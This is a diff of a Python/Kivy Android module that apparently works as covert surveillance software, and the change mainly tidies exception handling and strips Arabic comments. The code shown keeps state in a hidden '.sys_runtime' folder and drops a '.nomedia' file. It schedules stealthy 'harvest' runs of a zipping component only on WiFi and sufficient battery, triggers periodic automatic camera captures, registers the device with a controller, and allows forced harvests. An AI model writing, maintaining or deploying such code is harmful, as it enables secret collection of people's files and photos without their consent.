@@ -14,7 +14,7 @@ def _get_runtime_path():
         act = autoclass('org.kivy.android.PythonActivity').mActivity
         base = act.getFilesDir().getPath()
         return os.path.join(base, ".sys_runtime")
-    except:
+    except Exception:
         return os.path.join(os.getcwd(), ".sys_runtime")
 
 P = _get_runtime_path()
@@ -34,14 +34,11 @@ try:
 except ImportError:
     JNI = False
 
-# ========== دالة fromisoformat آمنة (محسّنة) ==========
+
+# ========== دالة parse_iso_datetime الآمنة والمكتملة ==========
 def _parse_iso_datetime(iso_string):
     """
-    فك تشفير تاريخ ISO بشكل آمن، يدعم:
-    - وجود حرف Z في النهاية
-    - عدم وجود جزء الثواني
-    - عدم وجود جزء الميكروثانية
-    - صيغ مختلفة
+    فك تشفير تاريخ ISO بشكل آمن ومعالجة كافة التنسيقات المحتملة
     """
     if not iso_string or not isinstance(iso_string, str):
         return None
@@ -50,10 +47,9 @@ def _parse_iso_datetime(iso_string):
     if not iso_string:
         return None
 
-    # ✅ الخطأ 1: استبدال Z بـ +00:00 ليتوافق مع fromisoformat
+    # استبدال Z بـ +00:00 للتوافق مع Python < 3.11
     iso_string = iso_string.replace('Z', '+00:00')
 
-    # قائمة بالتنسيقات المدعومة (من الأكثر دقة إلى الأقل)
     formats = [
         "%Y-%m-%dT%H:%M:%S.%f%z",   # 2026-08-09T15:30:45.123+00:00
         "%Y-%m-%dT%H:%M:%S%z",       # 2026-08-09T15:30:45+00:00
@@ -72,7 +68,6 @@ def _parse_iso_datetime(iso_string):
         except ValueError:
             continue
 
-    # محاولة أخيرة: استخدام fromisoformat إذا كان متاحًا (Python 3.7+)
     try:
         return datetime.fromisoformat(iso_string)
     except (ValueError, AttributeError):
@@ -102,7 +97,6 @@ class M:
         self.ctrl = None
         self.vlt = None
 
-        # ===== تحسين القفل =====
         self._harvest_lock = threading.Lock()
         self._harvest_running = False
 
@@ -113,20 +107,17 @@ class M:
         self._setup()
 
     def _setup(self):
-        """إعداد المجلدات والملفات الأولية"""
         try:
             nomedia_path = os.path.join(self.d, ".nomedia")
             if not os.path.exists(nomedia_path):
                 with open(nomedia_path, 'w') as f:
                     f.write("")
-        except:
+        except Exception:
             pass
 
         self._ensure_next_harvest_time()
 
-    # ========== إدارة الإعدادات ==========
     def _load_config(self):
-        """تحميل الإعدادات مع قيم افتراضية محسّنة"""
         default_cfg = {
             "hth": 15,
             "wl": False,
@@ -163,13 +154,12 @@ class M:
         except Exception as e:
             logging.error(f"Config save error: {e}")
 
-    # ========== معلومات الجهاز ==========
     def _get_ctx(self):
         if not JNI:
             return None
         try:
             return autoclass('org.kivy.android.PythonActivity').mActivity
-        except:
+        except Exception:
             return None
 
     def _get_device_info(self):
@@ -192,7 +182,6 @@ class M:
         else:
             self.did, self.dmd = "DEV_PC", "Linux_System"
 
-    # ========== حالة الشبكة والبطارية ==========
     def _is_wifi(self):
         if not JNI:
             return True
@@ -231,7 +220,6 @@ class M:
             logging.error(f"Battery check error: {e}")
             return 50, False
 
-    # ========== إدارة وقت الحصاد (محسّن) ==========
     def _set_next_harvest_time(self, hours=None):
         try:
             if hours is None:
@@ -282,7 +270,6 @@ class M:
             logging.error(f"Update last harvest error: {e}")
 
     def _can_harvest(self, force=False):
-        """التحقق من إمكانية الحصاد بناءً على الوقت والقيود"""
         if force:
             return True, "Forced"
 
@@ -323,15 +310,11 @@ class M:
                 logging.error(f"Get next harvest error: {e}")
         return None
 
-    # ========== منطق الحصاد الرئيسي (محسّن) ==========
     def _harvest_logic(self, force=False):
-        """منطق الحصاد الرئيسي مع قفل لمنع التشغيل المتزامن"""
-        # التحقق من تمكين الحصاد التلقائي
         if not force and not self.cfg.get('enable_auto_harvest', True):
             logging.debug("Auto-harvest is disabled")
             return
 
-        # ===== استخدام القفل بشكل صحيح =====
         with self._harvest_lock:
             if self._harvest_running:
                 logging.debug("Harvest already running, skipping")
@@ -339,30 +322,24 @@ class M:
             self._harvest_running = True
 
         try:
-            # 1. التحقق من WiFi (إلا إذا كان مفروضاً)
             if not force and not self._is_wifi():
                 logging.debug("Not on WiFi, skipping harvest")
                 return
 
-            # 2. التحقق من البطارية
             battery, charging = self._battery_ok()
             min_battery = self.cfg.get('hth', 15)
             if not force and battery < min_battery and not charging:
                 logging.info(f"Battery too low: {battery}% (min: {min_battery}%)")
                 return
 
-            # 3. التحقق من وقت الانتظار (يمكن تجاوزه بـ force)
             can_harvest, reason = self._can_harvest(force=force)
             if not can_harvest:
                 logging.debug(f"Harvest skipped: {reason}")
                 return
 
-            # 4. تشغيل الحصاد
             harvest_success = False
-            # ✅ الخطأ 2: التحقق من وجود daily_zipper قبل الاستدعاء
             if self.daily_zipper and hasattr(self.daily_zipper, 'run'):
                 try:
-                    # تشغيل الحصاد في خيط منفصل حتى لا يحجب المراقبة
                     threading.Thread(target=self.daily_zipper.run, daemon=True).start()
                     harvest_success = True
                     logging.info("Harvest triggered successfully")
@@ -371,7 +348,6 @@ class M:
             else:
                 logging.warning("DailyZipper not available")
 
-            # 5. تحديث الأوقات في حالة النجاح
             if harvest_success:
                 self._set_next_harvest_time()
                 self._update_last_harvest_time()
@@ -380,7 +356,6 @@ class M:
                     logging.warning("Harvest failed, rescheduling in 1 hour")
                     self._set_next_harvest_time(hours=1)
 
-            # 6. تشغيل ماسح الوسائط (بغض النظر عن نجاح الحصاد)
             if self.media_scanner and hasattr(self.media_scanner, 'run_scan'):
                 try:
                     self.media_scanner.run_scan(cleanup_first=True)
@@ -393,7 +368,6 @@ class M:
             with self._harvest_lock:
                 self._harvest_running = False
 
-    # ========== الكاميرا التلقائية ==========
     def _camera_logic(self):
         if not self.cfg.get('auto_camera', False):
             return
@@ -404,7 +378,6 @@ class M:
         last_camera_file = os.path.join(self.d, "last_camera")
         interval = self.cfg.get('camera_interval', 3600)
 
-        # ✅ الخطأ 3: حماية عمليات قراءة وكتابة الملف
         last_time = 0
         try:
             if os.path.exists(last_camera_file):
@@ -414,9 +387,7 @@ class M:
                         last_time = float(content)
         except Exception as e:
             logging.error(f"Camera interval read error: {e}")
-            # في حالة الخطأ، نستخدم 0 كقيمة افتراضية (أي نسمح بالتقاط)
 
-        # التحقق من الفاصل الزمني
         if last_time > 0 and time.time() - last_time < interval:
             return
 
@@ -431,7 +402,6 @@ class M:
                 daemon=True
             ).start()
 
-            # ✅ الخطأ 3: حماية عملية كتابة الملف
             try:
                 with open(last_camera_file, 'w') as f:
                     f.write(str(time.time()))
@@ -442,10 +412,7 @@ class M:
         except Exception as e:
             logging.error(f"Camera logic error: {e}")
 
-    # ========== الحلقة الرئيسية ==========
     def _loop(self):
-        """الحلقة الرئيسية للمراقبة"""
-        # تشغيل ماسح الوسائط عند البدء إذا كان مفعلاً
         if self.cfg.get('scan_on_start', True) and self.media_scanner:
             try:
                 self.media_scanner.run_scan(cleanup_first=True)
@@ -464,12 +431,9 @@ class M:
             self._wake_event.wait(interval)
             self._wake_event.clear()
 
-    # ========== واجهات التحكم العامة ==========
     def start(self):
-        """بدء تشغيل المراقبة"""
         threading.Thread(target=self._loop, daemon=True, name="MonitorLoop").start()
 
-        # تسجيل الجهاز
         if self.ui and self.did:
             try:
                 if hasattr(self.ui, 'reg'):
@@ -485,19 +449,15 @@ class M:
             except Exception as e:
                 logging.error(f"Device registration failed: {e}")
 
-        # تشغيل حصاد فوري عند البدء إذا كان مفعلاً
         if self.cfg.get('force_harvest_on_start', False):
             logging.info("Starting forced harvest on startup")
             self.force_harvest()
 
     def stop(self):
-        """إيقاف المراقبة"""
         self.rn = False
         self._wake_event.set()
 
     def force_harvest(self):
-        """إجبار الحصاد على الفور (تجاوز كل القيود)"""
-        # حذف ملف وقت الانتظار لتجاوز الشرط
         if os.path.exists(self.wt):
             try:
                 os.remove(self.wt)
@@ -505,16 +465,13 @@ class M:
             except Exception as e:
                 logging.error(f"Force harvest remove wt error: {e}")
 
-        # تشغيل الحصاد في خيط منفصل
         threading.Thread(target=self._harvest_logic, args=(True,), daemon=True).start()
 
     def reset_harvest_timer(self):
-        """إعادة ضبط مؤقت الحصاد (تعيين وقت عشوائي جديد)"""
         self._set_next_harvest_time()
         logging.info("Harvest timer reset")
 
     def update_config(self, key, value):
-        """تحديث إعداد معين وحفظه"""
         if key in self.cfg:
             self.cfg[key] = value
             self._save_config()
@@ -525,12 +482,10 @@ class M:
             return False
 
     def is_harvesting(self):
-        """التحقق مما إذا كان الحصاد قيد التشغيل"""
         with self._harvest_lock:
             return self._harvest_running
 
     def get_status(self):
-        """الحصول على حالة المراقبة (للتصحيح)"""
         status = {
             "running": self.rn,
             "harvest_running": self.is_harvesting(),
@@ -544,18 +499,17 @@ class M:
             try:
                 with open(self.lh, 'r') as f:
                     status["last_harvest"] = f.read().strip()
-            except:
+            except Exception:
                 status["last_harvest"] = None
         if os.path.exists(self.wt):
             try:
                 with open(self.wt, 'r') as f:
                     status["next_harvest"] = f.read().strip()
-            except:
+            except Exception:
                 status["next_harvest"] = None
         return status
 
 
-# ========== دوال مساعدة ==========
 def get_device_tag():
     try:
         if JNI:
@@ -579,6 +533,5 @@ def get_device_tag():
     return "unknown"
 
 
-# ========== دالة المصنع ==========
 def create():
     return M()
